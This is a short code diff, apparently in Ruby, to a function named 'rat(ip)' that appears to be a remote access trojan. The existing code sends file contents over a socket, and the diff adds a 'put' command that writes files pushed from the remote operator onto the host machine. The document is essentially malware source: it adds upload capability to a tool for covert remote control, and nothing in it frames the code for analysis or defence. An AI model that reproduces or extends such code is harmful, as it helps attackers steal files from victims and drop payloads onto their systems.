@@ -34,6 +34,24 @@ def rat(ip)
         socket.puts content
         file.close
         socket.puts 'done'
+      when 'put'
+
+        if format == 'binary'
+          file = File.open(file,'wb')
+        elsif format == 'text'
+          file = File.open(file,'w')
+        else
+          socket.puts 'done'
+        end
+
+        loop do
+          content = socket.gets.chomp
+          if content == 'done'
+            break
+          end
+          file.puts content
+        end
+        file.close
       end
     end
 
